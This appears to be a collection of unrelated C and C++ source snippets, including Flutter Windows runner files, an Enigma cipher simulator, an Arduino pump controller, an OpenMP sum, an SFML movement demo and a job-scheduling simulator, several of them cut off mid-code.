    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_adventuretime\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Enigma.h\"\n#include \"Rotor.h\"\n#include \"Switchboard.h\"\n\n#include <iostream>\n#include <string>\n#include <stdexcept>\n\n#pragma region Private\n\n    char Enigma::codeC(char letter) {\n        // printRotors();\n        int index = translateToIndex(this->switchboard.convert(letter));\n        // std::cout <<\"Index: \" << index <<\" Letter \"<<letter << std::endl;\n        for (int i = 0; i < 3; i++) {\n            index = this->rotors[i].codeForward(index);\n            // std::cout << i << \" | \" << index << \"/\" << translateToLetter(index) << std::endl;\n        }\n        index = reflect(index);\n        // std::cout << \"Ref: \" << index << \"/\" << translateToLetter(index) << std::endl;\n        for (int i = 2; i >= 0; i--) {\n            index = this->rotors[i].codeBackward(index);\n            // std::cout << i << \" | \" << index << \"/\" << translateToLetter(index) << std::endl;\n        }\n        index = translateToIndex(this->switchboard.convert(translateToLetter(index)));\n        // std::cout << \"Index: \" << index << \" Result: \" << translateToLetter(index) << std::endl<<std::endl;\n        turnRotors();\n        // printRotors();\n        return translateToLetter(index);\n    }\n\n#pragma endregion\n#pragma region Public\n    #pragma region Constructors and Destructors\n\n        Enigma::Enigma() {\n            this->switchboard = Switchboard(alphabet);\n            resetRotors();\n            this->mode = CryptMode::Encrypt;\n        }\n        Enigma::~Enigma() {\n        }\n\n    #pragma endregion\n\n    #pragma region Rotors\n\n        void Enigma::changeRotors(int serialNumber1, int serialNumber2, int serialNumber3) {\n            rotors[0].setGates(serialNumber1);\n            rotors[1].setGates(serialNumber2);\n            rotors[2].setGates(serialNumber3);            \n        }\n        void Enigma::changeRotor(int rotor, int serialNumber) {\n            rotors[rotor].setGates(serialNumber);\n        }\n\n        void Enigma::setRotations(char rotation1, char rotation2, char rotation3) {\n            this->rotors[0].setRotation(translateToIndex(rotation1));\n            this->rotors[1].setRotation(translateToIndex(rotation2));\n            this->rotors[2].setRotation(translateToIndex(rotation3));\n        }\n        void Enigma::setRotation(int rotor, char rotation) {\n            this->rotors[rotor].setRotation(translateToIndex(rotation));\n        }\n\n        void Enigma::setNotches(char notch1, char notch2, char notch3) {\n            rotors[0].setNotch(translateToIndex(notch1));\n            rotors[1].setNotch(translateToIndex(notch2));\n            rotors[2].setNotch(translateToIndex(notch3));\n        }\n        void Enigma::setNotch(int rotor, char notch) {\n            rotors[rotor].setNotch(translateToIndex(notch));\n        }\n\n        void Enigma::resetRotors() {\n            this->rotors = std::vector<Rotor> {\n                Rotor(1,0,25),\n                Rotor(2,0,25),\n                Rotor(3,0,25)\n            };\n        }\n\n        void Enigma::turnRotors() {\n            if (this->rotors[0].rotate()) {\n                if (this->rotors[1].rotate()) {\n                    this->rotors[2].rotate();\n                }\n            }\n        }\n\n        void Enigma::printRotors() {\n            std::cout << \"Rotor        |  I | II | III\" << std::endl;\n            std::cout << \"-------------+----+----+----+\" << std::endl;\n            std::cout << \"Serialnumber \";\n            for (int i = 0; i < 3; i++) {\n                std::cout << \"|  \" <<  rotors[i].getSerialNumber() << \" \";\n            }\n            std::cout << \"\\n-------------+----+----+----+\" << std::endl;\n            std::cout << \"Rotation     \";\n            for (int i = 0; i < 3; i++)\n            {\n                std::cout << \"|  \" << translateToLetter(rotors[i].getRotation()) << \" \";\n            }\n            std::cout << \"\\n-------------+----+----+----+\" << std::endl;\n            std::cout << \"Notch        \";\n            for (int i = 0; i < 3; i++)\n            {\n                std::cout << \"|  \" << translateToLetter(rotors[i].getNotch()) << \" \";\n            }\n            std::cout << std::endl << \"-------------+----+----+----+\\n\" << std::endl;\n        }\n        \n        std::vector<int> Enigma::getRotorsSerialNumbers() {\n            std::vector<int> result;\n            for (int i = 0; i < 3; i++) {\n                result.push_back(rotors[i].getSerialNumber());\n            }\n            return result;\n        }\n    #pragma endregion\n\n    #pragma region Reflector\n\n        int Enigma::reflect(int index) {\n            return index + reflector[index];\n        }\n    #pragma endregion\n    #pragma region Switchboard\n\n        char Enigma::getSwitchboardConnection(char a) {\n            return this->switchboard.convert(a);\n        }\n        void Enigma::addConnection(char a, char b) {\n            this->switchboard.setConnection(a, b);\n        }\n        void Enigma::removeConnection(char a) {\n            this->switchboard.removeConnection(a);\n        }\n        void Enigma::resetSwitchboard() {\n        ",
    "#include <Arduino.h>\n#include <HCSR04.h>\n\n#define TRIGGER 2\n#define ECHO 3\n#define BOMBA 12\n#define SENSOR_TEMP 11\n\n\nconst int LED_VERDE = 6; //acende quando a bomba estiver desligada\nconst int LED_VERMELHO = 5;//acende quando a bomba estiver ligada\nconst int LED_AMARELO = 7;//acende quando o bot\u00e3o de emerg\u00eancia for pressionado\n\nconst int LIGA = 9;\nconst int DESLIGA = 10;\n\nfloat nivel_tanque = 38.7; // capacidade maxima do tanque\nfloat nivel_baixo = 5; // nivel minimo do tanque;\nfloat nivel_amarelo = 6; // nivel para ligar o amarelo\nfloat nivel_alto = 8; //nivel maximo do tanque\nbool flag = false;\nbool flag2;\nfloat nivel;\n\nvoid ligarPinos(bool bomba, bool led_verm, bool led_verd, bool led_amar) {\n  digitalWrite(BOMBA, bomba);\n  digitalWrite(LED_VERDE, led_verd);\n  digitalWrite(LED_VERMELHO, led_verm);\n  digitalWrite(LED_AMARELO, led_amar);\n}\n\n\nUltraSonicDistanceSensor distanceSensor(TRIGGER,ECHO); //fun\u00e7\u00e3o para calcular a dist\u00e2ncia entre o n\u00edvel da \u00e1gua e o sensor\n\nvoid setup() {\n  // put your setup code here, to run once:\n  pinMode(LED_VERDE,OUTPUT);\n  pinMode(LED_VERMELHO,OUTPUT);\n  pinMode(LED_AMARELO,OUTPUT);\n  pinMode(TRIGGER,OUTPUT);\n  pinMode(BOMBA,OUTPUT);\n\n  pinMode(ECHO,INPUT);\n  pinMode(LIGA,INPUT);\n  pinMode(DESLIGA,INPUT);\n\n  digitalWrite(BOMBA,HIGH);\n  digitalWrite(LED_VERMELHO,LOW);\n  digitalWrite(LED_VERDE,LOW);\n  digitalWrite(LED_AMARELO,LOW);\n\n  Serial.begin(9600);\n\n}\nvoid loop() {\n\n  nivel = nivel_tanque - distanceSensor.measureDistanceCm();\n  Serial.print(\"Nivel: \");\n  Serial.println(nivel);\n  Serial.print(\"Medida sensor: \");\n  Serial.println(distanceSensor.measureDistanceCm());\n  delay(200);\n\n  if(digitalRead(DESLIGA)){\n    flag = false;\n    flag2 = false;\n    ligarPinos(1,0,0,0);\n  }\n\n  else if((nivel >= nivel_alto)  && (digitalRead(LIGA) || flag)){\n    flag = true;\n    flag2 = false;\n    ligarPinos(1,0,1,0);\n  }\n\n  else if((digitalRead(LIGA) || flag) && (nivel <= nivel_baixo || flag2)){\n    if(nivel >= nivel_amarelo){\n      ligarPinos(0,1,0,1);\n      delay(200);\n      ligarPinos(0,1,0,0);\n      delay(200);\n\n    } else{\n      ligarPinos(0,1,0,0);\n    }\n    flag = true;\n    flag2 = true;\n  }\n\n  delay(500);\n\n}",
    "#include \"parallel_sum.h\"\n\n// Global array definition\nint a[ARR_SIZE];\n\n// Function to initialize the array\nvoid initialize_array() {\n    for (int i = 0; i < ARR_SIZE; i++) {\n        a[i] = 1;  // Fill the array with 1s\n    }\n}\n\n// Function to compute the sum in parallel using OpenMP\nint compute_parallel_sum() {\n    int sum = 0;\n    int numt, tid;\n\n    // Start measuring time\n    double t1 = omp_get_wtime();\n\n    #pragma omp parallel default(shared) private(tid)\n    {\n        int from, to, psum = 0;\n        tid = omp_get_thread_num();\n        numt = omp_get_num_threads();\n        from = (ARR_SIZE / numt) * tid;\n        to = (ARR_SIZE / numt) * (tid + 1) - 1;\n\n        for (int i = from; i <= to; i++) {\n            psum += a[i];\n        }\n\n        #pragma omp critical\n        {\n            sum += psum;\n        }\n    }\n\n    double t2 = omp_get_wtime();  // End time\n\n    printf(\"Time taken = %f seconds\\n\", t2 - t1);\n    return sum;\n}\n\n// Main function\nint main(int argc, char *argv[]) {\n    // Initialize array\n    initialize_array();\n\n    // Compute sum\n    int sum = compute_parallel_sum();\n\n    // Print the result\n    printf(\"Sum = %d\\n\", sum);\n    return 0;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nclass Reservoir \n{\nprivate:\n    char* name;\n    float width;\n    float length;\n    float maxDepth;\n    char type; // \u00d2\u00e8\u00ef: 'L' \u00e4\u00eb\u00ff \u00ef\u00f0\u00f3\u00e4\u00e0, 'P' \u00e4\u00eb\u00ff \u00e1\u00e0\u00f1\u00f1\u00e5\u00e9\u00ed\u00e0, 'S' \u00e4\u00eb\u00ff \u00ec\u00ee\u00f0\u00ff\n\n    void copyString(const char* source) \n    {\n        if (source) \n        {\n            int len = 0;\n            while (source[len] != '\\0') \n            {\n                len++;\n            }\n            name = new char[len + 1];\n            for (int i = 0; i < len; i++) \n            {\n                name[i] = source[i];\n            }\n            name[len] = '\\0';\n        }\n        else \n        {\n            name = nullptr;\n        }\n    }\n\npublic:\n\n    Reservoir() : name(nullptr), width(0), length(0), maxDepth(0), type('L') {}\n\n\n    explicit Reservoir(const char* reservoirName, float w, float l, float d, char t)\n        : width(w), length(l), maxDepth(d), type(t)\n    {\n        copyString(reservoirName);\n    }\n\n\n    Reservoir(const Reservoir& other)\n        : width(other.width), length(other.length), maxDepth(other.maxDepth), type(other.type)\n    {\n        copyString(other.name);\n    }\n\n\n    Reservoir& operator=(const Reservoir& other) \n    {\n        if (this != &other) \n        {\n            delete[] name;\n            width = other.width;\n            length = other.length;\n            maxDepth = other.maxDepth;\n            type = other.type;\n            copyString(other.name);\n        }\n        return *this;\n    }\n\n    // \u00c4\u00e5\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0\n    ~Reservoir() \n    {\n        delete[] name;\n    }\n\n    float getVolume() const \n    {\n        return width * length * maxDepth;\n    }\n\n    float getSurfaceArea() const \n    {\n        return width * length;\n    }\n\n    bool isSameType(const Reservoir& other) const \n    {\n        return type == other.type;\n    }\n\n    bool compareSurfaceArea(const Reservoir& other) const \n    {\n        if (isSameType(other)) \n        {\n            return getSurfaceArea() > other.getSurfaceArea();\n        }\n        return false;\n    }\n\n    void setName(const char* reservoirName) \n    {\n        delete[] name;\n        copyString(reservoirName);\n    }\n\n    const char* getName() const \n    {\n        return name;\n    }\n\n    void display() const \n    {\n        cout << \"name: \" << (name ? name : \"not specified\") << endl;\n        cout << \"width: \" << width << \", length: \" << length << \", maximum depth: \" << maxDepth << endl;\n        cout << \"type: \" << (type == 'L' ? \"pond\" : (type == 'P' ? \"pool\" : \"sea\")) << endl;\n    }\n};\n\nclass ReservoirManager \n{\nprivate:\n    Reservoir* reservoirs;\n    int size;\n    int capacity;\n\npublic:\n    ReservoirManager() : size(0), capacity(2) \n    {\n        reservoirs = new Reservoir[capacity];\n    }\n\n    ~ReservoirManager() \n    {\n        delete[] reservoirs;\n    }\n\n\n    void addReservoir(const Reservoir& r) \n    {\n        if (size >= capacity) \n        {\n            capacity *= 2;\n            Reservoir* newReservoirs = new Reservoir[capacity];\n            for (int i = 0; i < size; i++) \n            {\n                newReservoirs[i] = reservoirs[i];\n            }\n            delete[] reservoirs;\n            reservoirs = newReservoirs;\n        }\n        reservoirs[size++] = r;\n    }\n\n\n    void removeReservoir(int index) \n    {\n        if (index < 0 || index >= size) \n        {\n            cout << \"index out of range\" << endl;\n            return;\n        }\n        for (int i = index; i < size - 1; i++) \n        {\n            reservoirs[i] = reservoirs[i + 1];\n        }\n        size--;\n    }\n\n\n    void displayAll() const \n    {\n        if (size == 0) \n        {\n            cout << \"no reservoirs available\" << endl;\n        }\n        else \n        {\n            for (int i = 0; i < size; i++) \n            {\n                cout << \"reservoir \" << (i + 1) << \":\" << endl;\n                reservoirs[i].display();\n                cout << endl;\n            }\n        }\n    }\n\n    int getSize() const \n    {\n        return size;\n    }\n};\n\n\nvoid displayMenu() \n{\n    cout << \"=====================================\" << endl;\n    cout << \"1. add a new reservoir\" << endl;\n    cout << \"2. remove a reservoir\" << endl;\n    cout << \"3. display all reservoirs\" << endl;\n    cout << \"4. exit\" << endl;\n    cout << \"your hoose: \";\n}\n\n\nReservoir createReservoirFromInput() \n{\n    char name[50];\n    float width, length, maxDepth;\n    char type;\n\n    cout << \"enter the name of the reservoir: \";\n    cin.ignore();\n    cin.getline(name, 50);\n\n    cout << \"enter width: \";\n    cin >> width;\n\n    cout << \"enter length: \";\n    cin >> length;\n\n    cout << \"enter maximum depth: \";\n    cin >> maxDepth;\n\n    cout << \"enter type (L for pond, P for pool, S for sea): \";\n    cin >> type;\n\n    return Reservoir(name, width, length, maxDepth, type);\n}\n\nint main() \n{\n    ReservoirManager manager;\n    int choice;\n\n    do \n    {\n        displayMenu();\n        cin >> choice;\n\n        switch (choice) \n        {\n        case 1: \n        {\n\n            Reservoir newReservoir = createReservoirFromInput();\n           ",
    "#include <SFML/System.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/Graphics.hpp>\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n#include <cmath>\n#include <iomanip>\n\nusing namespace sf;\n\n//bool drag(Vector2f &v, float &hyp, float &rad, float &drg,\n    //float &near0, bool playing, Time &dt, CircleShape &circle);\nvoid setRad(Vector2f &v, float &rad, float &hyp);\n\nint main()\n{\n    RenderWindow window(sf::VideoMode(800, 600), \"My window\");\n    window.setFramerateLimit(60);\n    Event event;\n\n    Clock clock; //restarts every frame\n\n    //movement settings\n    //inputs and .move() modify cartesian coords\n    //drag modifies polar coords\n    Vector2f v(0,0); //velocity cartesian coords\n    float hyp {0}; //hypotenuse of vel for polar coords\n    float rad {0}; //angle cw from +ve x axis in radians of vel for polar coords\n    constexpr float accUp {30}; //acceleration (how much is added to vel per frame)\n    constexpr float accDown {15};\n    constexpr float accLeft {15};\n    constexpr float accRight {15};\n    float drg {10}; //deceleration\n    float near0 {5}; //how close to 0 controls stop (+-)\n    float g {15}; //gravity\n\n    //circle instantiation\n    CircleShape circle(50);\n    circle.setFillColor(Color::Black);\n    circle.setPosition(350, 250);\n\n    while (window.isOpen()) //each iteration is a frame\n    {\n        window.setFramerateLimit(60);\n        Time dt = clock.restart(); //delta time\n\n        //close button\n        while (window.pollEvent(event))\n        {\n            if (event.type == Event::Closed) window.close();\n        }\n\n        //effect of drag\n        hyp = sqrt(v.y*v.y+v.x*v.x);\n        if (v.x > 0)\n        {\n            rad = atan(v.y/v.x);\n        } else if (v.x < 0) {\n            rad = atan(v.y/v.x) + M_PI;\n        } else if (abs(0 - v.x) < 0.1 && v.y > 0)\n        {\n            rad = M_PI/2;\n        } else if (abs(0 - v.x) < 0.1 && v.y < 0)\n        {\n            rad = -M_PI/2;\n        }\n        // std::cout << std::setw(20) << std::left << \"cos(rad) sin(rad)\" << std::setw(20) << std::left <<  cos(rad)*hyp*dt.asSeconds() << std::setw(20) <<  sin(rad)*hyp*dt.asSeconds() << '\\n';\n        // std::cout << std::setw(20) << std::left <<   \"hyp rad\" << std::setw(20) << std::left <<   hyp << std::setw(20) <<  rad << '\\n';\n        // std::cout << std::setw(20) << std::left <<   \"v.x v.y\" << std::setw(20) << std::left <<   v.x << std::setw(20) <<  v.y << \"\\n\\n\";\n        if (abs(0 - hyp) < near0)\n        {\n            //std::cout << std::setw(20) << hyp << \"!\\n\";\n            hyp = 0;\n            v.y = 0;\n            v.x = 0;\n        } else\n        {\n            hyp -= drg;\n            v.y = sin(rad)*hyp;\n            v.x = cos(rad)*hyp;\n            circle.move(v.x*dt.asSeconds(),v.y*dt.asSeconds());\n        }\n\n        //movement\n        //origin is top-left. imagine window as 1st cartesian quadrant flipped on x-axis\n        //up\n        if (Keyboard::isKeyPressed(Keyboard::Key::Up))\n        {//while holding, accelerate\n            v.y -= accUp;\n            circle.move(0,v.y*dt.asSeconds());\n        }\n        //down\n        else if (Keyboard::isKeyPressed(Keyboard::Key::Down))\n        {\n            v.y += accDown;\n            circle.move(0,v.y*dt.asSeconds());\n        }\n        //left\n        if (Keyboard::isKeyPressed(Keyboard::Key::Left))\n        {\n            v.x -= accLeft;\n            circle.move(v.x*dt.asSeconds(),0);\n        }\n        //right\n        else if (Keyboard::isKeyPressed(Keyboard::Key::Right))\n        {\n            v.x += accRight;\n            circle.move(v.x*dt.asSeconds(),0);\n        }\n\n        //effect of gravity (comment/uncomment to toggle)\n        v.y += g;\n\n        //repositioning when out of frame\n        if (circle.getPosition().y > 600) {\n            circle.setPosition(circle.getPosition().x, 0);\n        }\n        if (circle.getPosition().y < 0) {\n            circle.setPosition(circle.getPosition().x, 600);\n        }\n        if (circle.getPosition().x > 800) {\n            circle.setPosition(0, circle.getPosition().y);\n        }\n        if (circle.getPosition().x < 0) {\n            circle.setPosition(800, circle.getPosition().y);\n        }\n\n        //prints polar coords\n        //std::cout << '(' << hyp << \", \" << rad << \")\\n\";\n\n        window.clear(Color::Blue);\n        window.draw(circle);\n        window.display();\n    }\n    return 0;\n}\n\n//function implementations\n/*\nbool drag(Vector2f &v, float &hyp, float &rad, float &drg,\n    float &near0, bool playing, Time &dt, CircleShape &circle)\n{\n    if ((hyp < near0 && hyp > -near0) || Keyboard::isKeyPressed(Keyboard::Key::Down))\n    {//near zero v OR opp key pressed -> stop this control\n        playing = false;\n    }\n    else if (hyp >= near0 || hyp <= -near0)\n    {//decelerate\n        hyp -= drg;\n        circle.move(cos(rad)*hyp*dt.asSeconds(),sin(rad)*hyp*dt.asSeconds());\n    }\n    std::cout << playing << \"\\n\";\n    return playing;\n}\n*/\nvoid setRad(Vector2f &v, float &rad, float &hyp)\n{\n    //formatting ",
    "#include <iostream>\n#include <cstdio>\n#include <cstring>\n#include <queue>\n#include <cstdlib>\n#include <algorithm>\n#include <iomanip>\nusing namespace std;\n\nstruct node\n{\n    string name; // \u4f5c\u4e1a\u7684\u540d\u5b57\n    int Ctime;   // \u4f5c\u4e1a\u8fdb\u5165\u8f93\u5165\u4e95\u7684\u65f6\u95f4\uff08\u4ee5\u5206\u8ba1\uff09\n    int Rtime;   // \u4f5c\u4e1a\u7684\u8fd0\u884c\u65f6\u95f4\uff08\u4ee5\u5206\u8ba1\uff09\n    int Stime;   // \u4f5c\u4e1a\u5f00\u59cb\u8fd0\u884c\u7684\u65f6\u95f4\n    int Etime;   // \u4f5c\u4e1a\u8fd0\u884c\u7ed3\u675f\u7684\u65f6\u95f4\n    int Ttime;   // \u4f5c\u4e1a\u5468\u8f6c\u65f6\u95f4\n    float Wtime; // \u4f5c\u4e1a\u5e26\u6743\u5468\u8f6c\u65f6\u95f4\n};\n\nint Timestamp(string time) // \u65f6\u95f4\u6233\u8f6c\u6362\n{\n    int pos = time.find_last_of(':'); // \u627e\u5230\u6700\u540e\u5192\u53f7\uff0c\u4ee5\u5206\u9694\u5c0f\u65f6\u548c\u5206\u949f\n\n    string s1 = time.substr(0, pos); // \u63d0\u53d6\u5c0f\u65f6\u3001\u5206\u949f\u90e8\u5206\n    string s2 = time.substr(pos + 1);\n\n    int n1 = stoi(s1); // \u8f6c\u6362\u4e3a\u6574\u6570\n    int n2 = stoi(s2);\n\n    return n1 * 60 + n2; // \u8fd4\u56de\u5206\u949f\u683c\u5f0f\u65f6\u95f4\u6233\n}\n\nvoid p_Timestamp(int time)\n{\n    time%=24*60;\n    cout << setw(2) << setfill('0') << time / 60 << \":\"\n         << setw(2) << setfill('0') << time % 60 << \"\\t\";\n}\n\nvoid FCFS(int batchsize, vector<node> &work)\n{\n    queue<int> q;\n    vector<int> batch(batchsize + 1);\n    int work_id = 1;\n    int work_num = work.size() - 1;\n    int now_time = 0; // \u76ee\u524d\u65f6\u95f4\n    while (work_id <= work_num || !q.empty())\n    {\n        now_time++;\n        while (work_id <= work_num && now_time >= work[work_id].Ctime)\n        { // \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u5230\u8fbe\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4\n            q.push(work_id);\n            work_id++;\n        }\n\n        for (int i = 1; i <= batchsize; i++)\n        { // \u5224\u65ad\u73b0\u5728\u662f\u5426\u6709\u7a7a\u95f2\u7684\u6279\u5904\u7406\u5f39\u9053\n            if (now_time >= batch[i] && !q.empty())\n            { // \u5982\u679c\u6709\u7a7a\u95f2\u6279\u5904\u7406\u7cfb\u7edf\u4e14\u4efb\u52a1\u961f\u5217\u4e0d\u4e3a\u7a7a\uff0c\u5219\u53d6\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\uff0c\u52a0\u5165\u7cfb\u7edf\n                int idx = q.front();\n                q.pop();\n                work[idx].Stime = now_time;\n                work[idx].Etime = now_time + work[idx].Rtime;\n                work[idx].Ttime = work[idx].Etime - work[idx].Ctime;\n                work[idx].Wtime = work[idx].Ttime * 1.0 / work[idx].Rtime;\n                batch[i] = work[idx].Etime;\n            }\n        }\n    }\n}\n\nvoid SJF(int batchsize, vector<node> &work)\n{\n    int work_num = work.size() - 1;\n    vector<int> batch(batchsize + 1);\n    auto compareshort = [&](int x, int y)\n    {\n        return work[x].Rtime > work[y].Rtime;\n    };\n    priority_queue<int, vector<int>, decltype(compareshort)> q(compareshort);\n    int work_id = 1;\n    int now_time = 0; // \u76ee\u524d\u65f6\u95f4\n    while (work_id <= work_num || !q.empty())\n    {\n        now_time++;\n        while (work_id <= work_num && now_time >= work[work_id].Ctime)\n        { // \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u5230\u8fbe\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4\n            q.push(work_id);\n            work_id++;\n        }\n\n        for (int i = 1; i <= batchsize; i++)\n        { // \u5224\u65ad\u73b0\u5728\u662f\u5426\u6709\u7a7a\u95f2\u7684\u6279\u5904\u7406\u5f39\u9053\n            if (now_time >= batch[i] && !q.empty())\n            { // \u5982\u679c\u6709\u7a7a\u95f2\u6279\u5904\u7406\u7cfb\u7edf\u4e14\u4efb\u52a1\u961f\u5217\u4e0d\u4e3a\u7a7a\uff0c\u5219\u53d6\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\uff0c\u52a0\u5165\u7cfb\u7edf\n                int idx = q.top();\n                q.pop();\n                work[idx].Stime = now_time;\n                work[idx].Etime = now_time + work[idx].Rtime;\n                work[idx].Ttime = work[idx].Etime - work[idx].Ctime;\n                work[idx].Wtime = work[idx].Ttime * 1.0 / work[idx].Rtime;\n                batch[i] = work[idx].Etime;\n            }\n        }\n    }\n}\n\nvoid HRN(int batchsize, vector<node> &work)\n{\n    int work_num = work.size() - 1;\n    vector<int> batch(batchsize + 1);\n    int now_time = 0; // \u76ee\u524d\u65f6\u95f4\n    auto compare = [&](int x, int y)\n    {\n        return (now_time - work[x].Ctime) * (work[y].Rtime) < (now_time - work[y].Ctime) * (work[x].Rtime);\n    }; // \u6bd4\u8f83\u54cd\u5e94\u6bd4\u4f18\u5148\u8fd0\u7528(\u4f5c\u4e1a\u7b49\u5f85\u65f6\u95f4 / \u4f5c\u4e1a\u6267\u884c\u65f6\u95f4)\n\n    priority_queue<int, vector<int>, decltype(compare)> q(compare);\n    int work_id = 1;\n    while (work_id <= work_num || !q.empty())\n    {\n        now_time++;\n        while (work_id <= work_num && now_time >= work[work_id].Ctime)\n        { // \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u5230\u8fbe\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4\n            q.push(work_id);\n            work_id++;\n        }\n\n        for (int i = 1; i <= batchsize; i++)\n        { // \u5224\u65ad\u73b0\u5728\u662f\u5426\u6709\u7a7a\u95f2\u7684\u6279\u5904\u7406\u5f39\u9053\n            if (now_time >= batch[i] && !q.empty())\n            { // \u5982\u679c\u6709\u7a7a\u95f2\u6279\u5904\u7406\u7cfb\u7edf\u4e14\u4efb\u52a1\u961f\u5217\u4e0d\u4e3a\u7a7a\uff0c\u5219\u53d6\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\uff0c\u52a0\u5165\u7cfb\u7edf\n                int idx = q.top();\n                q.pop();\n                work[idx].Stime = now_time;\n                work[idx].Etime = now_time + work[idx].Rtime;\n                work[idx].Ttime = work[idx].Etime - work[idx].Ctime;\n                work[idx].Wtime = work[idx].Ttime * 1.0 / work[idx].Rtime;\n                batch[i] = work[idx].Etime;\n            }\n        }\n    }\n}\n\nvector<node> DataDeal()\n{\n    cout << \"\u8bf7\u8f93\u5165\u8981\u5904\u7406\u7684\u4efb\u52a1\u6570\u91cf: \";\n    int task_num;\n    cin >> task_num; // \u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u4efb\u52a1\u6570\u91cf\n    vector<node> work(task_num + 1);\n\n    string time;\n    cout << \"\u8bf7\u4f9d\u6b21\u8f93\u5165\u4efb\u52a1\u540d\u79f0\u3001\u8fdb\u5165\u65f6\u95f4\u548c\u8017\u65f6: \\n\"; // \u63d0\u793a\u7528\u6237\u8f93\u5165\u4efb\u52a1\u7684\u8be6\u7ec6\u4fe1\u606f\n\n    for (int i = 1; i <= task_num; ++i)\n    {\n        cin >> work[i].name;             // \u8f93\u5165\u4efb\u52a1\u540d\u79f0\n        cin >> time;                     // \u8f93\u5165\u4efb\u52a1\u8fdb\u5165\u65f6\u95f4\n        work[i].Ctime = Timestamp(time); // \u5c06\u8fdb\u5165\u65f6\u95f4\u8f6c\u6362\u4e3a\u65f6\u95f4\u6233\u683c\u5f0f\u5e76\u5b58\u50a8\n        cin >> work[i].Rtime;            // \u8f93\u5165\u4efb\u52a1\u8017\u65f6\n    }\n    cout << endl;\n    // \u5bf9\u4efb\u52a1\u6570\u7ec4\u8fdb\u884c\u81ea\u5b9a\u4e49\u6392\u5e8f\uff0c\u5229\u7528lambda\u51fd\u6570\n    sort(&work[1], &work[task_num + 1], [](node a, node b)\n         { return a.Ctime < b.Ctime; });\n    return work;\n}\n\nvoid PrintResults(string info, int batchsize, vector<node> work)\n{\n    int SumTtime = 0;\n    float SumWtime = 0;\n    int work_num = work.size() - 1;",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_gemini\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == 